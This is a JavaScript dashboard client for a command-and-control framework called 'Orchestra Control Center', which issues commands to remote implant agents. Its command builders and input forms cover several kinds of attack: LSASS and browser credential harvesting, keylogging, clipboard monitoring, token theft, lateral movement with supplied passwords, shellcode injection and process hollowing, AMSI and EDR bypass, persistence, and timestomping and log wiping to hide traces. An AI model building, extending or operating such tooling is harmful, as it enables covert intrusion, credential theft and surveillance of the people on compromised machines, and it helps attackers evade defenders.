// Orchestra Control Center — minimal dashboard client.
// Stores the bearer token in sessionStorage (cleared when the tab closes).

(() => {
  const $ = (id) => document.getElementById(id);
  let token = sessionStorage.getItem("oc_token") || "";
  let ws = null;

  const headers = () => ({
    "Authorization": "Bearer " + token,
    "Content-Type": "application/json",
  });

  async function api(path, opts = {}) {
    const res = await fetch("/api" + path, {
      ...opts,
      headers: { ...headers(), ...(opts.headers || {}) },
    });
    if (res.status === 401) throw new Error("unauthorized");
    return res;
  }

  // ── Login ─────────────────────────────────────────────────────────
  async function login() {
    const t = $("token").value.trim();
    if (!t) return;
    token = t;
    try {
      const res = await fetch("/api/agents", { headers: { "Authorization": "Bearer " + t } });
      if (res.status === 401) {
        $("login-err").textContent = "Invalid token.";
        return;
      }
      sessionStorage.setItem("oc_token", t);
      $("login").hidden = true;
      $("main-content").hidden = false;
      await refreshAgents();
      openWs();
    } catch (e) {
      $("login-err").textContent = "Connection failed: " + e.message;
    }
  }

  function fmtTime(epoch) {
    if (!epoch) return "—";
    const ago = Math.max(0, Math.floor(Date.now() / 1000) - epoch);
    if (ago < 60) return ago + "s ago";
    if (ago < 3600) return Math.floor(ago / 60) + "m ago";
    return new Date(epoch * 1000).toISOString();
  }

  // ── Agent table ───────────────────────────────────────────────────
  function renderAgents(agents) {
    $("agent-count").textContent = "(" + agents.length + ")";
    const tbody = $("agents-tbody");
    const sel = $("agent-select");
    const prevSel = sel.value;
    if (!agents.length) {
      tbody.innerHTML = '<tr><td colspan="5" class="muted">No agents connected.</td></tr>';
      sel.innerHTML = "";
      return;
    }
    tbody.innerHTML = agents.map(a =>
      `<tr><td><code>${escapeHtml(a.agent_id)}</code></td>` +
      `<td>${escapeHtml(a.hostname)}</td>` +
      `<td>${escapeHtml(a.peer)}</td>` +
      `<td>${fmtTime(a.last_seen)}</td>` +
      `<td>${escapeHtml(a.os || "—")}</td></tr>`
    ).join("");
    sel.innerHTML = agents.map(a => `<option value="${escapeAttr(a.agent_id)}">${escapeHtml(a.agent_id)}</option>`).join("");
    if (agents.find(a => a.agent_id === prevSel)) sel.value = prevSel;
    // Keep the shell tab agent selector in sync.
    const shellSel = document.getElementById("shell-agent-select");
    if (shellSel) {
      const prevShell = shellSel.value;
      shellSel.innerHTML = sel.innerHTML;
      if (agents.find(a => a.agent_id === prevShell)) shellSel.value = prevShell;
    }
  }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c]));
  }
  function escapeAttr(s) { return escapeHtml(s); }

  function hexToBytes(value, label) {
    const raw = String(value || "").trim();
    if (!raw) return [];

    const hex = raw
      .replace(/\b0x/gi, "")
      .replace(/[\s,;:_-]/g, "");

    if (!hex) return [];
    if (hex.length % 2 !== 0) {
      throw new Error(label + " must contain an even number of hex digits.");
    }
    if (!/^[0-9a-fA-F]+$/.test(hex)) {
      throw new Error(label + " contains non-hex characters.");
    }

    const bytes = [];
    for (let i = 0; i < hex.length; i += 2) {
      bytes.push(parseInt(hex.slice(i, i + 2), 16));
    }
    return bytes;
  }

  function splitList(value) {
    return String(value || "")
      .split(/[\n,]+/)
      .map((item) => item.trim())
      .filter(Boolean);
  }

  function parseOrdinalExports(value) {
    return splitList(value).map((entry) => {
      const match = entry.match(/^(\d+)\s*[:=]\s*(.+)$/);
      if (!match) {
        throw new Error("Ordinal exports must use 'ordinal:name' entries.");
      }
      const ordinal = parseInt(match[1], 10);
      const internalName = match[2].trim();
      if (!Number.isInteger(ordinal) || ordinal < 0 || ordinal > 65535) {
        throw new Error("Ordinal export values must be between 0 and 65535.");
      }
      if (!internalName) {
        throw new Error("Ordinal export entries must include an internal name.");
      }
      return [ordinal, internalName];
    });
  }

  function splitArgs(value) {
    return String(value || "").split(/\s+/).map((arg) => arg.trim()).filter(Boolean);
  }

  function optionalNumber(value, label) {
    const raw = String(value || "").trim();
    if (!raw) return null;
    const parsed = Number(raw);
    if (!Number.isInteger(parsed) || parsed < 0) {
      throw new Error(label + " must be a non-negative integer.");
    }
    return parsed;
  }

  async function refreshAgents() {
    try {
      const res = await api("/agents");
      const agents = await res.json();
      renderAgents(agents);
    } catch (e) {
      console.warn(e);
    }
  }

  // ── WebSocket ─────────────────────────────────────────────────────
  function openWs() {
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    // Browsers don't allow custom headers on WebSocket, so we pass the token
    // via the Sec-WebSocket-Protocol handshake header. The server's ws_handler
    // (orchestra-server/src/api.rs) extracts the value beginning with
    // "bearer." and validates it in constant time before completing the
    // upgrade; an unknown or missing token causes a 401 response.
    try {
      ws = new WebSocket(proto + "//" + location.host + "/api/ws", ["bearer." + token]);
      ws.onmessage = (ev) => {
        try {
          const m = JSON.parse(ev.data);
          if (m.kind === "agents") renderAgents(m.agents);
          if (m.kind === "audit") appendAudit(m.event);
        } catch {}
      };
      ws.onclose = () => setTimeout(openWs, 5000);
    } catch (e) {
      console.warn("ws open failed", e);
    }
    setInterval(refreshAgents, 5000);
  }

  function appendAudit(ev) {
    const line = `[${new Date(ev.timestamp * 1000).toISOString()}] ${ev.user} ${ev.action} -> ${ev.agent_id} (${ev.outcome === "Success" ? "ok" : "fail"}) ${ev.details}`;
    const el = $("audit");
    const filter = $("audit-filter") ? $("audit-filter").value.toLowerCase() : "";
    if (!filter || line.toLowerCase().includes(filter)) {
      el.textContent = (line + "\n" + el.textContent).split("\n").slice(0, 500).join("\n");
      const cntEl = $("audit-count");
      if (cntEl) {
        const count = el.textContent.split("\n").filter(l => l.trim()).length;
        cntEl.textContent = count + " entries";
      }
    }
  }

  // ── Modal dialog system ───────────────────────────────────────────
  let modalResolve = null;

  /**
   * Show a modal dialog with dynamically generated input fields.
   * @param {string} title - Modal title
   * @param {Array<{id:string,label:string,type?:string,placeholder?:string,value?:string}>} fields
   * @returns {Promise<Object|null>} - Resolves with {fieldId: value, ...} or null if cancelled
   */
  function showModal(title, fields) {
    return new Promise((resolve) => {
      modalResolve = resolve;
      $("modal-title").textContent = title;
      let html = "";
      for (const f of fields) {
        html += `<div class="modal-field">`;
        html += `<label>${escapeHtml(f.label)}</label>`;
        if (f.type === "textarea") {
          html += `<textarea id="modal-${f.id}" placeholder="${escapeAttr(f.placeholder || "")}" rows="4">${escapeHtml(f.value || "")}</textarea>`;
        } else {
          html += `<input id="modal-${f.id}" type="${f.type || "text"}" placeholder="${escapeAttr(f.placeholder || "")}" value="${escapeAttr(f.value || "")}">`;
        }
        html += `</div>`;
      }
      $("modal-body").innerHTML = html;
      $("modal-overlay").hidden = false;
      // Focus the first input
      const first = $("modal-body").querySelector("input, textarea");
      if (first) first.focus();
    });
  }

  function closeModal(result) {
    $("modal-overlay").hidden = true;
    if (modalResolve) {
      modalResolve(result);
      modalResolve = null;
    }
  }

  $("modal-confirm").addEventListener("click", () => {
    const inputs = $("modal-body").querySelectorAll("input, textarea");
    const result = {};
    inputs.forEach((el) => {
      const key = el.id.replace("modal-", "");
      result[key] = el.value;
    });
    closeModal(result);
  });

  $("modal-cancel").addEventListener("click", () => closeModal(null));
  $("modal-overlay").addEventListener("keydown", (e) => {
    if (e.key === "Escape") closeModal(null);
    if (e.key === "Enter" && !e.shiftKey && e.target.tagName !== "TEXTAREA") {
      e.preventDefault();
      $("modal-confirm").click();
    }
  });

  // ── Screenshot viewer ─────────────────────────────────────────────
  $("screenshot-close").addEventListener("click", () => {
    $("screenshot-overlay").hidden = true;
    $("screenshot-img").hidden = true;
  });

  function showScreenshot(base64Png) {
    const img = $("screenshot-img");
    img.src = "data:image/png;base64," + base64Png;
    img.hidden = false;
    $("screenshot-overlay").hidden = false;
  }

  // ── Command dispatch ──────────────────────────────────────────────
  /**
   * Build a command payload matching the Rust Command enum variants.
   * Each command name maps exactly to a Command enum variant.
   */
  function buildCommandPayload(cmdName, args) {
    switch (cmdName) {
      // ── Zero-arg commands ──
      case "Ping": return "Ping";
      case "GetSystemInfo": return "GetSystemInfo";
      case "ListProcesses": return "ListProcesses";
      case "CaptureScreen": return "CaptureScreen";
      case "StartHciLogging": return "StartHciLogging";
      case "StopHciLogging": return "StopHciLogging";
      case "GetHciLogBuffer": return "GetHciLogBuffer";
      case "ReloadConfig": return "ReloadConfig";
      case "EnablePersistence": return "EnablePersistence";
      case "DisablePersistence": return "DisablePersistence";
      case "ListPlugins": return "ListPlugins";
      case "Shutdown": return "Shutdown";
      case "Rev2Self": return "Rev2Self";
      case "GetSystem": return "GetSystem";
      case "LSAWhispererStatus": return "LSAWhispererStatus";
      case "LSAWhispererStop": return "LSAWhispererStop";
      case "UnhookNtdll": return "UnhookNtdll";
      case "EvanescoStatus": return "EvanescoStatus";
      case "KernelCallbackScan": return "KernelCallbackScan";
      case "KernelCallbackRestore": return "KernelCallbackRestore";
      case "EvasionTransformScan": return "EvasionTransformScan";
      case "EvasionTransformRun": return "EvasionTransformRun";
      case "CetStatus": return "CetStatus";
      case "RevertToken": return "RevertToken";
      case "ListTokens": return "ListTokens";
      case "DisablePrefetch": return "DisablePrefetch";
      case "RestorePrefetch": return "RestorePrefetch";
      case "SyncTimestamps": return "SyncTimestamps";
      case "SandboxCheck": return "SandboxCheck";
      case "EdrBypassStatus": return "EdrBypassStatus";
      case "MorphNow": return { MorphNow: { seed: parseInt(args.seed, 10) || 0 } };
      case "KeyloggerDump": return "KeyloggerDump";
      case "KeyloggerStop": return "KeyloggerStop";
      case "ClipboardGet": return "ClipboardGet";
      case "ClipboardMonitorDump": return "ClipboardMonitorDump";
      case "ClipboardMonitorStop": return "ClipboardMonitorStop";
      case "ListTopology": return "ListTopology";
      case "ListLinks": return "ListLinks";

      // ── Single-string-arg commands ──
      case "ListDirectory": return { ListDirectory: { path: args.path } };
      case "ReadFile": return { ReadFile: { path: args.path } };
      case "RunApprovedScript": return { RunApprovedScript: { script: args.script } };
      case "DeployModule": return { DeployModule: { module_id: args.module_id } };
      case "ExecutePlugin": return { ExecutePlugin: { plugin_id: args.plugin_id, args: args.plugin_args || "" } };
      case "UnloadPlugin": return { UnloadPlugin: { plugin_id: args.plugin_id } };
      case "GetPluginInfo": return { GetPluginInfo: { plugin_id: args.plugin_id } };
      case "JobStatus": return { JobStatus: { job_id: args.job_id } };

      // ── WriteFile: path + content bytes ──
      case "WriteFile": return { WriteFile: { path: args.path, content: Array.from(new TextEncoder().encode(args.content)) } };

      // ── DownloadModule: module_id + optional repo_url ──
      case "DownloadModule": {
        const dl = { module_id: args.module_id, repo_url: args.repo_url || null };
        return { DownloadModule: dl };
      }

      // ── ExecutePluginBinary ──
      case "ExecutePluginBinary":
        return { ExecutePluginBinary: { plugin_id: args.plugin_id, input_data: Array.from(new TextEncoder().encode(args.input_data || "")) } };

      // ── Numeric-arg commands ──
      case "SimulateKey": return { SimulateKey: { key: args.key } };
      case "SimulateMouse": return { SimulateMouse: { x: parseInt(args.x, 10) || 0, y: parseInt(args.y, 10) || 0 } };
      case "MigrateAgent": return { MigrateAgent: { target_pid: parseInt(args.target_pid, 10) || 0 } };
      case "SetReencodeSeed": return { SetReencodeSeed: { seed: parseInt(args.seed, 10) || 0 } };

      // ── Screenshot with optional monitor index ──
      case "Screenshot": return { Screenshot: { monitor: parseInt(args.monitor, 10) || 0 } };

      // ── Keylogger ──
      case "KeyloggerStart": return { KeyloggerStart: { interval_ms: parseInt(args.interval_ms, 10) || 1000 } };

      // ── Clipboard Monitor ──
      case "ClipboardMonitorStart": return { ClipboardMonitorStart: { interval_ms: parseInt(args.interval_ms, 10) || 2000 } };

      // ── Network Discovery sub-ops ──
      case "NetArpScan": return { NetworkDiscovery: { operation: "arp_scan" } };
      case "NetPingSweep": return { NetworkDiscovery: { operation: { ping_sweep: { subnet: args.subnet, timeout_ms: parseInt(args.timeout_ms, 10) || 3000, max_concurrent: parseInt(args.max_concurrent, 10) || 64 } } } };
      case "NetTcpScan": return { NetworkDiscovery: { operation: { tcp_port_scan: { host: args.host, ports: (args.ports || "80,443,22,445").split(",").map(p => parseInt(p.trim(), 10)).filter(p => p > 0), concurrency: parseInt(args.concurrency, 10) || 128, timeout_ms: parseInt(args.timeout_ms, 10) || 3000 } } } };
      case "NetReverseDns": return { NetworkDiscovery: { operation: { reverse_dns: { ip: args.ip } } } };
      case "NetAdSrv": return { NetworkDiscovery: { operation: { ad_srv_discovery: { domain: args.domain } } } };

      // ── Credential Harvesting ──
      case "HarvestLSASS": return "HarvestLSASS";
      case "HarvestLSA": return { HarvestLSA: { method: args.method || "auto" } };
      case "BrowserData": return { BrowserData: { browser: args.browser || "all", data_type: args.data_type || "all" } };

      // ── Token Manipulation ──
      case "MakeToken": return { MakeToken: { username: args.username, password: args.password, domain: args.domain || ".", logon_type: parseInt(args.logon_type, 10) || 2 } };
      case "StealToken": return { StealToken: { target_pid: parseInt(args.target_pid, 10) || 0 } };
      case "ImpersonatePipe": return { ImpersonatePipe: { pipe_name: args.pipe_name || "" } };

      // ── Lateral Movement ──
      case "PsExec": return { PsExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
      case "WmiExec": return { WmiExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
      case "DcomExec": return { DcomExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
      case "WinRmExec": return { WinRmExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };

      // ── Injection Engine ──
      case "UnifiedInject": return { UnifiedInject: { target_process: args.target_process, payload: hexToBytes(args.payload_hex, "Payload"), technique: args.technique || null, evade: true } };
      case "TransactedHollow": return { TransactedHollow: { target_process: args.target_process, payload: hexToBytes(args.payload_hex, "Payload"), etw_blinding: args.etw_blinding === "true" } };
      case "DelayedStomp": return { DelayedStomp: { target_pid: parseInt(args.target_pid, 10) || 0, payload: hexToBytes(args.payload_hex, "Payload"), delay_secs: args.delay_secs ? parseInt(args.delay_secs, 10) : null } };
      case "InjectSideLoad": return { InjectSideLoad: { pid: parseInt(args.pid, 10) || 0, payload: hexToBytes(args.payload_hex, "Payload"), export_config: { forward_target: args.forward_target || "kernel32.dll", named_exports: splitList(args.named_exports), ordinal_exports: parseOrdinalExports(args.ordinal_exports) } } };
      case "ExecuteAssembly": return { ExecuteAssembly: { data: hexToBytes(args.assembly_data, "Assembly data"), args: splitArgs(args.args), timeout_secs: optionalNumber(args.timeout_secs, "Assembly timeout") } };
      case "ExecuteBOF": return { ExecuteBOF: { data: hexToBytes(args.bof_data, "BOF data"), args: splitArgs(args.args), timeout_secs: optionalNumber(args.timeout_secs, "BOF timeout") } };

      // ── Advanced Evasion ──
      case "SetSleepVariant": return { SetSleepVariant: { variant: args.variant || "auto" } };
      case "AmsiBypassMode": return { AmsiBypassMode: { mode: args.mode || "auto" } };
      case "EvanescoSetThreshold": return { EvanescoSetThreshold: { idle_ms: parseInt(args.idle_ms, 10) || 5000 } };
      case "KernelCallbackNuke": return { KernelCallbackNuke: { drivers: [] } };
      case "SyscallEmulationToggle": return { SyscallEmulationToggle: { enabled: args.enabled === "true" } };

      // ── P2P Mesh ──
      case "LinkAgents": return { LinkAgents: { agent_a: args.agent_a, agent_b: args.agent_b } };
      case "UnlinkAgent": return { UnlinkAgent: { agent_id: args.agent_id } };
      case "LinkTo": return { LinkTo: { parent: args.parent } };
      case "Unlink": return "Unlink";
      case "MeshConnect": return { MeshConnect: { peer: args.peer } };
      case "MeshDisconnect": return { MeshDisconnect: { peer: args.peer } };
      case "MeshKillSwitch": return "MeshKillSwitch";
      case "MeshQuarantine": return { MeshQuarantine: { peer: args.peer } };
      case "MeshClearQuarantine": return { MeshClearQuarantine: { peer: args.peer } };
      case "MeshSetCompartment": return { MeshSetCompartment: { compartment: args.compartment } };

      // ── Forensic Cleanup ──
      case "CleanPrefetch": return { CleanPrefetch: { exe_name: args.exe_name || "" } };
      case "Timestomp": return { Timestomp: { file_path: args.file_path, reference_file: args.reference_file || "" } };
      case "TimestompDirectory": return { TimestompDirectory: { dir_path: args.dir_path, reference_file: args.reference_file || "" } };
      case "CleanUsn": return { CleanUsn: { volume: args.volume || "" } };

      default: return "Ping";
    }
  }

  if (globalThis.__ORCHESTRA_DASHBOARD_TEST__) {
    globalThis.__ORCHESTRA_DASHBOARD_TEST__.buildCommandPayload = buildCommandPayload;
    globalThis.__ORCHESTRA_DASHBOARD_TEST__.hexToBytes = hexToBytes;
    globalThis.__ORCHESTRA_DASHBOARD_TEST__.parseOrdinalExports = parseOrdinalExports;
  }

  /**
   * Per-command modal field definitions.
   * Commands not listed here are zero-arg and skip the modal.
   */
  const CMD_FIELDS = {
    ListDirectory: [{ id: "path", label: "Directory Path", placeholder: "/home/user" }],
    ReadFile: [{ id: "path", label: "File Path", placeholder: "/etc/hostname" }],
    WriteFile: [
      { id: "path", label: "File Path", placeholder: "/tmp/note.txt" },
      { id: "content", label: "File Content", type: "textarea", placeholder: "File content to write..." },
    ],
    RunApprovedScript: [{ id: "script", label: "Script Name", placeholder: "collect-logs" }],
    DeployModule: [{ id: "module_id", label: "Module ID", placeholder: "scanner-v2" }],
    DownloadModule: [
      { id: "module_id", label: "Module ID", placeholder: "scanner-v2" },
      { id: "repo_url", label: "Repository URL (optional)", placeholder: "https://..." },
    ],
    ExecutePlugin: [
      { id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" },
      { id: "plugin_args", label: "Arguments", placeholder: "--verbose" },
    ],
    ExecutePluginBinary: [
      { id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" },
      { id: "input_data", label: "Input Data (text)", placeholder: "data to pass" },
    ],
    GetPluginInfo: [{ id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" }],
    UnloadPlugin: [{ id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" }],
    SimulateKey: [{ id: "key", label: "Key", placeholder: "A" }],
    SimulateMouse: [
      { id: "x", label: "X coordinate", placeholder: "100" },
      { id: "y", label: "Y coordinate", placeholder: "200" },
    ],
    MigrateAgent: [{ id: "target_pid", label: "Target PID", placeholder: "1234" }],
    SetReencodeSeed: [{ id: "seed", label: "Seed (u64)", placeholder: "123456789" }],
    MorphNow: [{ id: "seed", label: "Seed (u64)", placeholder: "987654321" }],
    JobStatus: [{ id: "job_id", label: "Job ID", placeholder: "uuid" }],

    // ── Surveillance ──
    Screenshot: [{ id: "monitor", label: "Monitor Index (0 = primary)", placeholder: "0" }],
    KeyloggerStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "1000" }],
    ClipboardMonitorStart: [{ id: "interval_ms", label: "Poll Interval (ms)", placeholder: "2000" }],

    // ── Network Discovery ──
    NetPingSweep: [
      { id: "subnet", label: "Subnet (CIDR or prefix)", placeholder: "192.168.1.0/24" },
      { id: "timeout_ms", label: "Timeout (ms)", placeholder: "3000" },
      { id: "max_concurrent", label: "Max concurrent probes", placeholder: "64" },
    ],
    NetTcpScan: [
      { id: "host", label: "Target IP", placeholder: "192.168.1.1" },
      { id: "ports", label: "Ports (comma-separated)", placeholder: "22,80,443,445,3389" },
      { id: "concurrency", label: "Concurrency", placeholder: "128" },
      { id: "timeout_ms", label: "Timeout (ms)", placeholder: "3000" },
    ],
    NetReverseDns: [{ id: "ip", label: "IP Address", placeholder: "192.168.1.1" }],
    NetAdSrv: [{ id: "domain", label: "Domain", placeholder: "corp.example.com" }],

    // ── Credential Harvesting ──
    HarvestLSA: [
      { id: "method", label: "Method (untrusted / ssp_inject / auto)", placeholder: "auto" },
    ],
    BrowserData: [
      { id: "browser", label: "Browser (chrome / edge / firefox / all)", placeholder: "all" },
      { id: "data_type", label: "Data Type (credentials / cookies / all)", placeholder: "all" },
    ],

    // ── Token Manipulation ──
    MakeToken: [
      { id: "username", label: "Username", placeholder: "admin" },
      { id: "password", label: "Password", placeholder: "P@ssw0rd" },
      { id: "domain", label: "Domain", placeholder: "." },
      { id: "logon_type", label: "Logon Type (2=Interactive, 3=Network, 9=NewCreds)", placeholder: "2" },
    ],
    StealToken: [{ id: "target_pid", label: "Target PID", placeholder: "1234" }],
    ImpersonatePipe: [{ id: "pipe_name", label: "Pipe Name (empty = random)", placeholder: "\\\\.\\pipe\\status" }],

    // ── Lateral Movement ──
    PsExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
    WmiExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
    DcomExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
    WinRmExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],

    // ── Injection Engine ──
    UnifiedInject: [
      { id: "target_process", label: "Target Process Name", placeholder: "svchost.exe" },
      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
      { id: "technique", label: "Technique (auto / ProcessHollow / ModuleStomp / ...)", placeholder: "auto" },
    ],
    TransactedHollow: [
      { id: "target_process", label: "Target Process Name", placeholder: "notepad.exe" },
      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
      { id: "etw_blinding", label: "ETW Blinding (true / false)", placeholder: "true" },
    ],
    DelayedStomp: [
      { id: "target_pid", label: "Target PID", placeholder: "1234" },
      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
      { id: "delay_secs", label: "Delay override seconds (optional)", placeholder: "" },
    ],
    InjectSideLoad: [
      { id: "pid", label: "Target PID", placeholder: "1234" },
      { id: "payload_hex", label: "Payload (hex-encoded shellcode)", type: "textarea", placeholder: "4d5a9000..." },
      { id: "forward_target", label: "Export Forward DLL", placeholder: "kernel32.dll" },
      { id: "named_exports", label: "Named Exports (comma or newline separated)", type: "textarea", placeholder: "CreateFileW\nGetLastError" },
      { id: "ordinal_exports", label: "Ordinal Exports (ordinal:name)", type: "textarea", placeholder: "1:DllRegisterServer\n2:DllUnregisterServer" },
    ],
    ExecuteAssembly: [
      { id: "assembly_data", label: "Assembly (.NET PE, hex-encoded)", type: "textarea", placeholder: "4d5a9000..." },
      { id: "args", label: "Arguments (space-separated)", placeholder: "--arg1 --arg2" },
      { id: "timeout_secs", label: "Timeout seconds (optional)", placeholder: "30" },
    ],
    ExecuteBOF: [
      { id: "bof_data", label: "BOF/COFF data (hex-encoded)", type: "textarea", placeholder: "4d5a9000..." },
      { id: "args", label: "Arguments (space-separated)", placeholder: "arg1 arg2" },
      { id: "timeout_secs", label: "Timeout seconds (optional)", placeholder: "60" },
    ],

    // ── Advanced Evasion ──
    SetSleepVariant: [
      { id: "variant", label: "Variant (auto / timer_queue / apc / fiber / heavy_fiber / heap_encrypt)", placeholder: "auto" },
    ],
    AmsiBypassMode: [
      { id: "mode", label: "Mode (hwbp / memory_patch / write_raid / auto)", placeholder: "auto" },
    ],
    EvanescoSetThreshold: [{ id: "idle_ms", label: "Idle threshold (ms)", placeholder: "5000" }],
    SyscallEmulationToggle: [
      { id: "enabled", label: "Enable emulation (true / false)", placeholder: "true" },
    ],

    // ── P2P Mesh ──
    LinkAgents: [
      { id: "agent_a", label: "Agent A ID", placeholder: "uuid-a" },
      { id: "agent_b", label: "Agent B ID", placeholder: "uuid-b" },
    ],
    UnlinkAgent: [{ id: "agent_id", label: "Agent ID to unlink", placeholder: "uuid" }],
    LinkTo: [{ id: "parent", label: "Parent agent ID or address", placeholder: "uuid-or-host:port" }],
    MeshConnect: [{ id: "peer", label: "Peer address", placeholder: "10.0.0.2:9001" }],
    MeshDisconnect: [{ id: "peer", label: "Peer address", placeholder: "10.0.0.2:9001" }],
    MeshQuarantine: [{ id: "peer", label: "Peer ID", placeholder: "uuid" }],
    MeshClearQuarantine: [{ id: "peer", label: "Peer ID", placeholder: "uuid" }],
    MeshSetCompartment: [{ id: "compartment", label: "Compartment name", placeholder: "red-team" }],

    // ── Forensic Cleanup ──
    CleanPrefetch: [{ id: "exe_name", label: "Executable name (empty = all)", placeholder: "cmd.exe" }],
    Timestomp: [
      { id: "file_path", label: "Target file path", placeholder: "C:\\Windows\\Temp\\file.exe" },
      { id: "reference_file", label: "Reference file (empty = ntdll.dll)", placeholder: "" },
    ],
    TimestompDirectory: [
      { id: "dir_path", label: "Target directory", placeholder: "C:\\Windows\\Temp" },
      { id: "reference_file", label: "Reference file (empty = ntdll.dll)", placeholder: "" },
    ],
    CleanUsn: [{ id: "volume", label: "Volume path (empty = system volume)", placeholder: "C:" }],
  };

  /** Commands that require zero arguments (no modal needed). */
  const ZERO_ARG_CMDS = new Set([
    "Ping", "GetSystemInfo", "ListProcesses", "CaptureScreen",
    "StartHciLogging", "StopHciLogging", "GetHciLogBuffer", "ReloadConfig",
    "EnablePersistence", "DisablePersistence", "ListPlugins", "Shutdown",
    "Rev2Self", "GetSystem",
    "LSAWhispererStatus", "LSAWhispererStop", "UnhookNtdll",
    "EvanescoStatus", "KernelCallbackScan", "KernelCallbackRestore",
    "EvasionTransformScan", "EvasionTransformRun", "CetStatus",
    "RevertToken", "ListTokens", "DisablePrefetch", "RestorePrefetch",
    "SyncTimestamps", "SandboxCheck", "EdrBypassStatus",
    "NetArpScan", "KeyloggerDump", "KeyloggerStop",
    "ClipboardGet", "ClipboardMonitorDump", "ClipboardMonitorStop",
    "ListTopology", "ListLinks", "Unlink", "MeshKillSwitch",
    "HarvestLSASS",
  ]);

  async function handleCommand(cmdName) {
    const agentId = $("agent-select").value;
    if (!agentId) { alert("No agent selected."); return; }

    // ── Dangerous commands require explicit "yes" confirmation ──
    const DANGER_CMDS = ["Shutdown", "MeshKillSwitch", "KernelCallbackNuke"];
    if (DANGER_CMDS.includes(cmdName)) {
      const result = await showModal("Confirm " + cmdName, [
        { id: "confirm", label: 'Type "yes" to confirm:', placeholder: "yes" },
      ]);
      if (!result || result.confirm.toLowerCase() !== "yes") return;
    }

    // ── Commands needing modal input ──
    let args = {};
    if (CMD_FIELDS[cmdName]) {
      const result = await showModal(cmdName, CMD_FIELDS[cmdName]);
      if (!result) return; // cancelled
      args = result;
    }

    let command;
    try {
      command = buildCommandPayload(cmdName, args);
    } catch (e) {
      $("result").textContent = e.message;
      $("result").className = "err";
      return;
    }
    $("result").textContent = "Sending…";
    $("result").className = "muted";

    try {
      const res = await api("/agents/" + encodeURIComponent(agentId) + "/command", {
        method: "POST",
        body: JSON.stringify({ command }),
      });
      const body = await res.json();
      const cls = body.outcome === "ok" ? "ok" : "err";
      $("result").className = cls;

      // ── Screenshot rendering ──
      // If CaptureScreen returns base64 PNG data, render it inline
      if (cmdName === "CaptureScreen" && body.outcome === "ok" && body.output) {
        // output may be a raw base64 string or JSON containing base64
        let b64 = body.output.trim();
        // Try to parse as JSON first (might be {data: "..."})
        try {
          const parsed = JSON.parse(b64);
          if (parsed.data) b64 = parsed.data;
          else if (typeof parsed === "string") b64 = parsed;
        } catch (_) {
          // not JSON — treat as raw base64
        }
        $("result").textContent = "Screenshot captured. Displaying image...";
        showScreenshot(b64);
      } else {
        $("result").textContent = JSON.stringify(body, null, 2);
      }
    } catch (e) {
      $("result").className = "err";
      $("result").textContent = "Request failed: " + e.message;
    }
  }

  // ── Wire up all command buttons ───────────────────────────────────
  document.querySelectorAll(".cmd-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      const cmd = btn.getAttribute("data-cmd");
      if (cmd) handleCommand(cmd);
    });
  });

  // ── Tab switching ─────────────────────────────────────────────────
  const tabDash = $("tab-dash");
  const tabShell = $("tab-shell");
  const tabBuilder = $("tab-builder");
  const tabLogs = $("tab-logs");
  const btnDash = $("tab-btn-dash");
  const btnShell = $("tab-btn-shell");
  const btnBuilder = $("tab-btn-builder");
  const btnLogs = $("tab-btn-logs");
  const allTabs = [tabDash, tabShell, tabBuilder, tabLogs];
  const allBtns = [btnDash, btnShell, btnBuilder, btnLogs];

  function activateTab(activeIdx) {
    allTabs.forEach((t, i) => { t.hidden = i !== activeIdx; });
    allBtns.forEach((b, i) => { b.className = i === activeIdx ? "tab-btn active" : "tab-btn"; });
  }

  btnDash.addEventListener("click", () => activateTab(0));
  btnShell.addEventListener("click", () => { activateTab(1); syncShellAgentSelect(); });
  btnBuilder.addEventListener("click", () => activateTab(2));
  btnLogs.addEventListener("click", () => activateTab(3));

  function syncShellAgentSelect() {
    const src = $("agent-select");
    const dst = $("shell-agent-select");
    const prev = dst.value;
    dst.innerHTML = src.innerHTML;
    if (dst.querySelector(`option[value="${escapeAttr(prev)}"]`)) dst.value = prev;
  }

  // ── xterm.js shell session ────────────────────────────────────────
  let term = null;
  let shellAgentId = null;
  let shellSessionId = null;
  let shellPollTimer = null;

  function initTerm() {
    if (term) { term.dispose(); }
    term = new Terminal({
      theme: {
        background: "#0d1117",
        foreground: "#e6edf3",
        cursor: "#58a6ff",
        selectionBackground: "#264f78",
        black: "#0d1117", red: "#f85149", green: "#3fb950", yellow: "#d29922",
        blue: "#58a6ff", magenta: "#bc8cff", cyan: "#39c5cf", white: "#e6edf3",
        brightBlack: "#8b949e", brightRed: "#ff7b72", brightGreen: "#56d364",
